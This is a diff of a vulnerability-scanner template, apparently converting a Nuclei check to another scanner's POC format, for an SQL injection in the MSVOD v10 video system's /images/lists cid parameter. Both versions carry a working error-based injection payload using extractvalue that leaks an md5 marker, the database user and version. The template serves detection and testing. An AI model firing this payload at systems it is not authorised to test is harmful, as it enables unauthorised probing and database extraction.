@@ -1,19 +1,17 @@
 id: msvod-sqli
 
 info:
-  name: 魅思视频系统 v10 版本 lists.html 文件 cid参数 SQL注入漏洞
-  author: Str1am
-  severity: high
-  tags: msvod,sqli
+    name: msvod sqli
+    author: jinqi
+    severity: high
 
-requests:
-  - method: GET
-    path:
-      - "{{BaseURL}}/images/lists?cid=13%20)%20ORDER%20BY%201%20desc,extractvalue(rand(),concat(0x7c,md5(123),0x7c,user(),0x7c,@@version))%20desc%20--%20"
-    matchers-condition: and
-    matchers:
-      - type: word
-        words:
-          - "202cb962ac59075b964b07152d234b7"
-        part: body
-        condition: and
+set:
+    r1: randomInt(800000000, 1000000000)
+rules:
+    r0:
+        request:
+            method: GET
+            path: /images/lists?cid=1 ) ORDER BY 1 desc,extractvalue(rand(),concat(0x7c,md5({{r1}}))) desc --+a
+        expression: response.body.bcontains(bytes(substr(md5(string(r1)), 0, 31)))
+expression: r0()
+
